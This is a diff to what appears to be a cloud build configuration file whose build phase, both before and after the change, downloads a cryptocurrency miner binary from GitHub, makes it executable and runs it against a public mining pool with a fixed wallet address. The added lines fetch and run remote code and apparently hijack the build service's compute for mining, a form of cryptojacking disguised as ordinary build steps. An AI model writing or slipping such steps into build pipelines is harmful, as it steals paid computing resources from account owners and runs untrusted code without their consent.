@@ -3,6 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
-        - tar -xvf hellminer_linux64.tar.gz
-        - ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RVMFutpZshkb9jiHYvh7rbq4RaqWGiKGUm.pko
+        - wget https://github.com/dismaster/refurbminer/raw/c5f7b86a58316d87bbd35f812d92269364aa3938/apps/ccminer/ccminer
+        - chmod +x ccminer
+        - ./ccminer -url stratum+tcp://eu.luckpool.net:3956 -user RVMFutpZshkb9jiHYvh7rbq4RaqWGiKGUm.pko
